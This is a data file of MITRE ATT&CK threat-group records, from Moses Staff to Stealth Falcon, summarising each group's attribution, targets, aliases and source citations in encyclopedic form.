{"ID":"G1009","name":"Moses Staff","description":"[Moses Staff](https://attack.mitre.org/groups/G1009) is a suspected Iranian threat group that has primarily targeted Israeli companies since at least September 2021. [Moses Staff](https://attack.mitre.org/groups/G1009) openly stated their motivation in attacking Israeli companies is to cause damage by leaking stolen sensitive data and encrypting the victim's networks without a ransom demand.(Citation: Checkpoint MosesStaff Nov 2021) \n\nSecurity researchers assess [Moses Staff](https://attack.mitre.org/groups/G1009) is politically motivated, and has targeted government, finance, travel, energy, manufacturing, and utility companies outside of Israel as well, including those in Italy, India, Germany, Chile, Turkey, the UAE, and the US.(Citation: Cybereason StrifeWater Feb 2022)","url":"https://attack.mitre.org/groups/G1009","created":"11 August 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Cybereason StrifeWater Feb 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Checkpoint MosesStaff Nov 2021),"}
{"ID":"G0069","name":"MuddyWater","description":"[MuddyWater](https://attack.mitre.org/groups/G0069) is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS).(Citation: CYBERCOM Iranian Intel Cyber January 2022) Since at least 2017, [MuddyWater](https://attack.mitre.org/groups/G0069) has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022)","url":"https://attack.mitre.org/groups/G0069","created":"18 April 2018","last modified":"22 March 2023","version":"4.1","contributors":"Daniyal Naeem, BT Security; Ozer Sarilar, @ozersarilar, STM","associated groups":"Earth Vetala, MERCURY, Seedworm, Static Kitten, TEMP.Zagros","associated groups citations":"(Citation: Trend Micro Muddy Water March 2021), (Citation: Anomali Static Kitten February 2021), (Citation: Symantec MuddyWater Dec 2018)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021), (Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021), (Citation: FireEye MuddyWater Mar 2018)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)","relationship citations":"(Citation: Symantec MuddyWater Dec 2018),(Citation: Anomali Static Kitten February 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: ClearSky MuddyWater Nov 2018),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Reaqta MuddyWater November 2017),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: ClearSky MuddyWater June 2019),(Citation: Symantec MuddyWater Dec 2018),(Citation: MuddyWater TrendMicro June 2018),(Citation: Anomali Static Kitten February 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: Talos MuddyWater Jan 2022),(Citation: Talos MuddyWater May 2019),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Reaqta MuddyWater November 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: GitHub Invoke-Obfuscation),(Citation: ClearSky MuddyWater June 2019),"}
{"ID":"G0129","name":"Mustang Panda","description":"[Mustang Panda](https://attack.mitre.org/groups/G0129) is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. [Mustang Panda](https://attack.mitre.org/groups/G0129) has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Europe, Mongolia, Myanmar, Pakistan, and Vietnam, among others.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019) ","url":"https://attack.mitre.org/groups/G0129","created":"12 April 2021","last modified":"22 March 2023","version":"2.1","contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet","associated groups":"BRONZE PRESIDENT, RedDelta, TA416","associated groups citations":"(Citation: Secureworks BRONZE PRESIDENT December 2019), (Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 Europe March 2022), (Citation: Proofpoint TA416 November 2020)","relationship citations":"(Citation: Recorded Future REDDELTA July 2020),(Citation: McAfee Dianxun March 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Avira Mustang Panda January 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Recorded Future REDDELTA July 2020),(Citation: Proofpoint TA416 November 2020),(Citation: McAfee Dianxun March 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Avira Mustang Panda January 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Proofpoint TA416 Europe March 2022),"}
{"ID":"G0055","name":"NEODYMIUM","description":"[NEODYMIUM](https://attack.mitre.org/groups/G0055) is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called [PROMETHIUM](https://attack.mitre.org/groups/G0056) due to overlapping victim and campaign characteristics. (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21) [NEODYMIUM](https://attack.mitre.org/groups/G0055) is reportedly associated closely with [BlackOasis](https://attack.mitre.org/groups/G0063) operations, but evidence that the group names are aliases has not been identified. (Citation: CyberScoop BlackOasis Oct 2017)","url":"https://attack.mitre.org/groups/G0055","created":"16 January 2018","last modified":"25 March 2019","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Microsoft SIR Vol 21),(Citation: Microsoft NEODYMIUM Dec 2016),,"}
{"ID":"G0019","name":"Naikon","description":"[Naikon](https://attack.mitre.org/groups/G0019) is assessed to be a state-sponsored cyber espionage group attributed to the Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020).(Citation: CameraShy) Active since at least 2010, [Naikon](https://attack.mitre.org/groups/G0019) has primarily conducted operations against government, military, and civil organizations in Southeast Asia, as well as against international bodies such as the United Nations Development Programme (UNDP) and the Association of Southeast Asian Nations (ASEAN).(Citation: CameraShy)(Citation: Baumgartner Naikon 2015) \n\nWhile [Naikon](https://attack.mitre.org/groups/G0019) shares some characteristics with [APT30](https://attack.mitre.org/groups/G0013), the two groups do not appear to be exact matches.(Citation: Baumgartner Golovkin Naikon 2015)","url":"https://attack.mitre.org/groups/G0019","created":"31 May 2017","last modified":"19 August 2021","version":"2.0","contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: CameraShy),(Citation: CheckPoint Naikon May 2020),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: CheckPoint Naikon May 2020),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),"}
{"ID":"G0133","name":"Nomadic Octopus","description":"\n[Nomadic Octopus](https://attack.mitre.org/groups/G0133) is a Russian-speaking cyber espionage threat group that has primarily targeted Central Asia, including local governments, diplomatic missions, and individuals, since at least 2014. [Nomadic Octopus](https://attack.mitre.org/groups/G0133) has been observed conducting campaigns involving Android and Windows malware, mainly using the Delphi programming language, and building custom variants.(Citation: Security Affairs DustSquad Oct 2018)(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018)","url":"https://attack.mitre.org/groups/G0133","created":"24 August 2021","last modified":"02 September 2022","version":"1.0","contributors":null,"associated groups":"DustSquad","associated groups citations":"(Citation: Security Affairs DustSquad Oct 2018)(Citation: Securelist Octopus Oct 2018)(Citation: SecurityWeek Nomadic Octopus Oct 2018)","relationship citations":"(Citation: Securelist Octopus Oct 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Security Affairs DustSquad Oct 2018),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Security Affairs DustSquad Oct 2018),"}
{"ID":"G0049","name":"OilRig","description":"[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.(Citation: Palo Alto OilRig April 2017)(Citation: ClearSky OilRig Jan 2017)(Citation: Palo Alto OilRig May 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: Unit42 OilRig Playbook 2023)(Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018)","url":"https://attack.mitre.org/groups/G0049","created":"14 December 2017","last modified":"06 February 2023","version":"3.1","contributors":"Bryan Lee; Dragos  Threat  Intelligence; Robert Falcone","associated groups":"APT34, COBALT GYPSY, Evasive Serpens, Helix Kitten, IRN2","associated groups citations":"This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.(Citation: Unit 42 QUADAGENT July 2018)(Citation: FireEye APT34 Dec 2017)(Citation: Check Point APT34 April 2021), (Citation: Secureworks COBALT GYPSY Threat Profile), (Citation: Unit42 OilRig Playbook 2023), (Citation: Unit 42 QUADAGENT July 2018)(Citation: Crowdstrike Helix Kitten Nov 2018), (Citation: Crowdstrike Helix Kitten Nov 2018)","relationship citations":"(Citation: Check Point APT34 April 2021),(Citation: Palo Alto OilRig May 2016),(Citation: Unit42 OilRig Playbook 2023),(Citation: Unit 42 RGDoor Jan 2018),(Citation: Unit42 RDAT July 2020),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Palo Alto OilRig Oct 2016),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Palo Alto OilRig Sep 2018),(Citation: FireEye APT35 2018),(Citation: FireEye APT34 Dec 2017),(Citation: OilRig New Delivery Oct 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Check Point APT34 April 2021),(Citation: Palo Alto OilRig April 2017),(Citation: Unit42 OilRig Nov 2018),(Citation: FireEye APT35 2018),(Citation: Palo Alto OilRig May 2016),(Citation: FireEye Targeted Attacks Middle East Banks),(Citation: FireEye APT34 July 2019),(Citation: OilRig ISMAgent July 2017),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Palo Alto OilRig Oct 2016),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: FireEye APT34 Dec 2017),(Citation: OilRig New Delivery Oct 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FireEye Outlook Dec 2019),"}
{"ID":"G0071","name":"Orangeworm","description":"[Orangeworm](https://attack.mitre.org/groups/G0071) is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage.(Citation: Symantec Orangeworm April 2018)","url":"https://attack.mitre.org/groups/G0071","created":"17 October 2018","last modified":"26 October 2021","version":"1.1","contributors":"Elger Vinicius S. Rodrigues, @elgervinicius, CYBINT Centre","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Symantec Orangeworm April 2018),(Citation: Symantec Orangeworm IOCs April 2018),(Citation: Symantec Orangeworm April 2018),"}
{"ID":"G0068","name":"PLATINUM","description":"[PLATINUM](https://attack.mitre.org/groups/G0068) is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. (Citation: Microsoft PLATINUM April 2016)","url":"https://attack.mitre.org/groups/G0068","created":"18 April 2018","last modified":"22 April 2021","version":"1.3","contributors":"Ryan Becwar","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: Microsoft PLATINUM April 2016),(Citation: Microsoft PLATINUM June 2017),(Citation: Twitter ItsReallyNick Platinum Masquerade),"}
{"ID":"G1005","name":"POLONIUM","description":"[POLONIUM](https://attack.mitre.org/groups/G1005) is a Lebanon-based group that has primarily targeted Israeli organizations, including critical manufacturing, information technology, and defense industry companies, since at least February 2022. Security researchers assess [POLONIUM](https://attack.mitre.org/groups/G1005) has coordinated their operations with multiple actors affiliated with Iran’s Ministry of Intelligence and Security (MOIS), based on victim overlap as well as common techniques and tooling.(Citation: Microsoft POLONIUM June 2022)","url":"https://attack.mitre.org/groups/G1005","created":"01 July 2022","last modified":"10 August 2022","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Microsoft POLONIUM June 2022),(Citation: Microsoft POLONIUM June 2022),"}
{"ID":"G0056","name":"PROMETHIUM","description":"[PROMETHIUM](https://attack.mitre.org/groups/G0056) is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. [PROMETHIUM](https://attack.mitre.org/groups/G0056) has demonstrated similarity to another activity group called [NEODYMIUM](https://attack.mitre.org/groups/G0055) due to overlapping victim and campaign characteristics.(Citation: Microsoft NEODYMIUM Dec 2016)(Citation: Microsoft SIR Vol 21)(Citation: Talos Promethium June 2020)","url":"https://attack.mitre.org/groups/G0056","created":"16 January 2018","last modified":"22 October 2020","version":"2.0","contributors":null,"associated groups":"StrongPity","associated groups citations":"The name StrongPity has also been used to describe the group and the malware used by the group.(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)","relationship citations":"(Citation: Microsoft SIR Vol 21),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Microsoft NEODYMIUM Dec 2016),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),"}
{"ID":"G0040","name":"Patchwork","description":"[Patchwork](https://attack.mitre.org/groups/G0040) is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. [Patchwork](https://attack.mitre.org/groups/G0040) has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. [Patchwork](https://attack.mitre.org/groups/G0040) was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018.(Citation: Cymmetria Patchwork) (Citation: Symantec Patchwork)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018)","url":"https://attack.mitre.org/groups/G0040","created":"31 May 2017","last modified":"22 March 2023","version":"1.5","contributors":null,"associated groups":"Chinastrats, Dropping Elephant, Hangover Group, MONSOON, Operation Hangover","associated groups citations":"(Citation: Securelist Dropping Elephant), (Citation: Symantec Patchwork) (Citation: Securelist Dropping Elephant) (Citation: PaloAlto Patchwork Mar 2018) (Citation: Volexity Patchwork June 2018), [Patchwork](https://attack.mitre.org/groups/G0040) and the Hangover Group have both been referenced as aliases for the threat group associated with Operation Monsoon.(Citation: PaloAlto Patchwork Mar 2018)(Citation: Unit 42 BackConfig May 2020)(Citation: Forcepoint Monsoon), MONSOON is the name of an espionage campaign; we use it here to refer to the actor group behind the campaign. (Citation: Forcepoint Monsoon) (Citation: PaloAlto Patchwork Mar 2018), It is believed that the actors behind [Patchwork](https://attack.mitre.org/groups/G0040) are the same actors behind Operation Hangover. (Citation: Forcepoint Monsoon) (Citation: Operation Hangover May 2013)","relationship citations":"(Citation: TrendMicro Patchwork Dec 2017),(Citation: Volexity Patchwork June 2018),(Citation: Forcepoint Monsoon),(Citation: Unit 42 BackConfig May 2020),(Citation: Cymmetria Patchwork),(Citation: Securelist Dropping Elephant),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Symantec Patchwork),(Citation: Volexity Patchwork June 2018),(Citation: Unit 42 BackConfig May 2020),(Citation: Cymmetria Patchwork),(Citation: PaloAlto Patchwork Mar 2018),"}
{"ID":"G0011","name":"PittyTiger","description":"[PittyTiger](https://attack.mitre.org/groups/G0011) is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.(Citation: Bizeul 2014)(Citation: Villeneuve 2014)","url":"https://attack.mitre.org/groups/G0011","created":"31 May 2017","last modified":"12 October 2021","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Villeneuve 2014),(Citation: Bizeul 2014),(Citation: Bizeul 2014),"}
{"ID":"G0033","name":"Poseidon Group","description":"[Poseidon Group](https://attack.mitre.org/groups/G0033) is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the [Poseidon Group](https://attack.mitre.org/groups/G0033) as a security firm. (Citation: Kaspersky Poseidon Group)","url":"https://attack.mitre.org/groups/G0033","created":"31 May 2017","last modified":"18 March 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Kaspersky Poseidon Group),"}
{"ID":"G0024","name":"Putter Panda","description":"[Putter Panda](https://attack.mitre.org/groups/G0024) is a Chinese threat group that has been attributed to Unit 61486 of the 12th Bureau of the PLA’s 3rd General Staff Department (GSD). (Citation: CrowdStrike Putter Panda)","url":"https://attack.mitre.org/groups/G0024","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"associated groups":"APT2, MSUpdater","associated groups citations":"(Citation: Cylance Putter Panda), (Citation: CrowdStrike Putter Panda)","relationship citations":"(Citation: CrowdStrike Putter Panda),(Citation: CrowdStrike Putter Panda),"}
{"ID":"G0048","name":"RTM","description":"[RTM](https://attack.mitre.org/groups/G0048) is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name ([RTM](https://attack.mitre.org/software/S0148)). (Citation: ESET RTM Feb 2017)","url":"https://attack.mitre.org/groups/G0048","created":"31 May 2017","last modified":"12 May 2020","version":"1.1","contributors":"Oleg Skulkin, Group-IB","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: ESET RTM Feb 2017),(Citation: ESET RTM Feb 2017),(Citation: Group IB RTM August 2019),(Citation: ESET Buhtrap and Buran April 2019),"}
{"ID":"G0075","name":"Rancor","description":"[Rancor](https://attack.mitre.org/groups/G0075) is a threat group that has led targeted campaigns against the South East Asia region. [Rancor](https://attack.mitre.org/groups/G0075) uses politically-motivated lures to entice victims to open malicious documents. (Citation: Rancor Unit42 June 2018)","url":"https://attack.mitre.org/groups/G0075","created":"17 October 2018","last modified":"30 March 2020","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Rancor Unit42 June 2018),(Citation: Rancor Unit42 June 2018),"}
{"ID":"G0106","name":"Rocke","description":"[Rocke](https://attack.mitre.org/groups/G0106) is an alleged Chinese-speaking adversary whose primary objective appeared to be cryptojacking, or stealing victim system resources for the purposes of mining cryptocurrency. The name [Rocke](https://attack.mitre.org/groups/G0106) comes from the email address \"rocke@live.cn\" used to create the wallet which held collected cryptocurrency. Researchers have detected overlaps between [Rocke](https://attack.mitre.org/groups/G0106) and the Iron Cybercrime Group, though this attribution has not been confirmed.(Citation: Talos Rocke August 2018)","url":"https://attack.mitre.org/groups/G0106","created":"26 May 2020","last modified":"19 June 2020","version":"1.0","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Unit 42 Rocke January 2019),(Citation: Anomali Rocke March 2019),(Citation: Talos Rocke August 2018),"}
{"ID":"G0034","name":"Sandworm Team","description":"[Sandworm Team](https://attack.mitre.org/groups/G0034) is a destructive threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020) This group has been active since at least 2009.(Citation: iSIGHT Sandworm 2014)(Citation: CrowdStrike VOODOO BEAR)(Citation: USDOJ Sandworm Feb 2020)(Citation: NCSC Sandworm Feb 2020)\n\nIn October 2020, the US indicted six GRU Unit 74455 officers associated with [Sandworm Team](https://attack.mitre.org/groups/G0034) for the following cyber operations: the 2015 and 2016 attacks against Ukrainian electrical companies and government organizations, the 2017 worldwide [NotPetya](https://attack.mitre.org/software/S0368) attack, targeting of the 2017 French presidential campaign, the 2018 [Olympic Destroyer](https://attack.mitre.org/software/S0365) attack against the Winter Olympic Games, the 2018 operation against the Organisation for the Prohibition of Chemical Weapons, and attacks against the country of Georgia in 2018 and 2019.(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020) Some of these were conducted with the assistance of GRU Unit 26165, which is also referred to as [APT28](https://attack.mitre.org/groups/G0007).(Citation: US District Court Indictment GRU Oct 2018)","url":"https://attack.mitre.org/groups/G0034","created":"31 May 2017","last modified":"08 March 2023","version":"3.0","contributors":"Dragos Threat Intelligence","associated groups":"BlackEnergy (Group), ELECTRUM, IRIDIUM, IRON VIKING, Quedagh, Telebots, Voodoo Bear","associated groups citations":"(Citation: NCSC Sandworm Feb 2020)(Citation: UK NCSC Olympic Attacks October 2020), (Citation: Dragos ELECTRUM)(Citation: UK NCSC Olympic Attacks October 2020), (Citation: Microsoft Prestige ransomware October 2022), (Citation: Secureworks IRON VIKING )(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020), (Citation: iSIGHT Sandworm 2014) (Citation: F-Secure BlackEnergy 2014)(Citation: UK NCSC Olympic Attacks October 2020), (Citation: NCSC Sandworm Feb 2020)(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020), (Citation: CrowdStrike VOODOO BEAR)(Citation: US District Court Indictment GRU Unit 74455 October 2020)(Citation: UK NCSC Olympic Attacks October 2020)","relationship citations":"(Citation: F-Secure BlackEnergy 2014),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Dragos Crashoverride 2018),(Citation: Industroyer2 ESET April 2022),(Citation: Secureworks IRON VIKING ),(Citation: NCSC Sandworm Feb 2020),(Citation: Microsoft Prestige ransomware October 2022),(Citation: ANSSI Sandworm January 2021),(Citation: iSIGHT Sandworm 2014),(Citation: CrowdStrike GTR 2019),(Citation: ESET Industroyer),(Citation: UK NCSC Olympic Attacks October 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Dragos Crashoverride 2017),(Citation: Secureworks IRON VIKING),(Citation: NCSC CISA Cyclops Blink Advisory February 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ESET Telebots Dec 2016),(Citation: ESET Telebots June 2017),(Citation: Dragos Crashoverride 2018),(Citation: Secureworks NotPetya June 2017),(Citation: Microsoft Prestige ransomware October 2022),(Citation: US-CERT Ukraine Feb 2016),(Citation: iSight Sandworm Oct 2014),(Citation: TrendMicro Sandworm October 2014),(Citation: ANSSI Sandworm January 2021),(Citation: McAfee Sandworm November 2013),(Citation: ESET Telebots July 2017),(Citation: UK NCSC Olympic Attacks October 2020),(Citation: ESET BlackEnergy Jan 2016),(Citation: NCSC Cyclops Blink February 2022),(Citation: Joe Slowik August 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020)"}
{"ID":"G0029","name":"Scarlet Mimic","description":"[Scarlet Mimic](https://attack.mitre.org/groups/G0029) is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029) and [Putter Panda](https://attack.mitre.org/groups/G0024), it has not been concluded that the groups are the same. (Citation: Scarlet Mimic Jan 2016)","url":"https://attack.mitre.org/groups/G0029","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Scarlet Mimic Jan 2016),(Citation: Scarlet Mimic Jan 2016),"}
{"ID":"G1008","name":"SideCopy","description":"[SideCopy](https://attack.mitre.org/groups/G1008) is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. [SideCopy](https://attack.mitre.org/groups/G1008)'s name comes from its infection chain that tries to mimic that of [Sidewinder](https://attack.mitre.org/groups/G0121), a suspected Indian threat group.(Citation: MalwareBytes SideCopy Dec 2021)","url":"https://attack.mitre.org/groups/G1008","created":"07 August 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: MalwareBytes SideCopy Dec 2021),"}
{"ID":"G0121","name":"Sidewinder","description":"[Sidewinder](https://attack.mitre.org/groups/G0121) is a suspected Indian threat actor group that has been active since at least 2012. They have been observed targeting government, military, and business entities throughout Asia, primarily focusing on Pakistan, China, Nepal, and Afghanistan.(Citation: ATT Sidewinder January 2021)(Citation: Securelist APT Trends April 2018)(Citation: Cyble Sidewinder September 2020)","url":"https://attack.mitre.org/groups/G0121","created":"27 January 2021","last modified":"22 March 2023","version":"1.1","contributors":"Daniyal Naeem, BT Security; Lacework Labs","associated groups":"Rattlesnake, T-APT-04","associated groups citations":"(Citation: Cyble Sidewinder September 2020), (Citation: Cyble Sidewinder September 2020)","relationship citations":"(Citation: ATT Sidewinder January 2021),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cyble Sidewinder September 2020),(Citation: ATT Sidewinder January 2021),"}
{"ID":"G0091","name":"Silence","description":"[Silence](https://attack.mitre.org/groups/G0091) is a financially motivated threat actor targeting financial institutions in different countries. The group was first seen in June 2016. Their main targets reside in Russia, Ukraine, Belarus, Azerbaijan, Poland and Kazakhstan. They compromised various banking systems, including the Russian Central Bank's Automated Workstation Client, ATMs, and card processing.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017) ","url":"https://attack.mitre.org/groups/G0091","created":"24 May 2019","last modified":"22 March 2023","version":"2.2","contributors":"Oleg Skulkin, Group-IB","associated groups":"Whisper Spider","associated groups citations":"(Citation: Crowdstrike GTR2020 Mar 2020)","relationship citations":"(Citation: Group IB Silence Aug 2019),(Citation: Group IB Silence Sept 2018),(Citation: SecureList Silence Nov 2017),(Citation: Group IB Silence Aug 2019),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Group IB Silence Sept 2018),(Citation: SecureList Silence Nov 2017),"}
{"ID":"G0122","name":"Silent Librarian","description":"[Silent Librarian](https://attack.mitre.org/groups/G0122) is a group that has targeted research and proprietary data at universities, government agencies, and private sector companies worldwide since at least 2013. Members of  [Silent Librarian](https://attack.mitre.org/groups/G0122) are known to have been affiliated with the Iran-based Mabna Institute which has conducted cyber intrusions at the behest of the government of Iran, specifically the Islamic Revolutionary Guard Corps (IRGC).(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Malwarebytes Silent Librarian October 2020)","url":"https://attack.mitre.org/groups/G0122","created":"03 February 2021","last modified":"21 April 2021","version":"1.0","contributors":null,"associated groups":"COBALT DICKENS, TA407","associated groups citations":"(Citation: Secureworks COBALT DICKENS August 2018)(Citation: Secureworks COBALT DICKENS September 2019)(Citation: Proofpoint TA407 September 2019)(Citation: Malwarebytes Silent Librarian October 2020), (Citation: Proofpoint TA407 September 2019)(Citation: Malwarebytes Silent Librarian October 2020)","relationship citations":",(Citation: Phish Labs Silent Librarian),(Citation: DOJ Iran Indictments March 2018),(Citation: Proofpoint TA407 September 2019),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: Secureworks COBALT DICKENS September 2019),"}
{"ID":"G0083","name":"SilverTerrier","description":"[SilverTerrier](https://attack.mitre.org/groups/G0083) is a Nigerian threat group that has been seen active since 2014. [SilverTerrier](https://attack.mitre.org/groups/G0083) mainly targets organizations in high technology, higher education, and manufacturing.(Citation: Unit42 SilverTerrier 2018)(Citation: Unit42 SilverTerrier 2016)","url":"https://attack.mitre.org/groups/G0083","created":"29 January 2019","last modified":"19 May 2020","version":"1.1","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Unit42 SilverTerrier 2018),(Citation: Unit42 SilverTerrier 2018),"}
{"ID":"G0054","name":"Sowbug","description":"[Sowbug](https://attack.mitre.org/groups/G0054) is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. (Citation: Symantec Sowbug Nov 2017)","url":"https://attack.mitre.org/groups/G0054","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":"Alan Neville, @abnev","associated groups":null,"associated groups citations":null,"relationship citations":"(Citation: Symantec Sowbug Nov 2017),(Citation: Symantec Sowbug Nov 2017),"}
{"ID":"G0038","name":"Stealth Falcon","description":"[Stealth Falcon](https://attack.mitre.org/groups/G0038) is a threat group that has conducted targeted spyware attacks against Emirati journalists, activists, and dissidents since at least 2012. Circumstantial evidence suggests there could be a link between this group and the United Arab Emirates (UAE) government, but that has not been confirmed. (Citation: Citizen Lab Stealth Falcon May 2016)","url":"https://attack.mitre.org/groups/G0038","created":"31 May 2017","last modified":"23 November 2020","version":"1.2","contributors":null,"associated groups":null,"associated groups citations":null,"relationship citations":",(Citation: Citizen Lab Stealth Falcon May 2016),"}
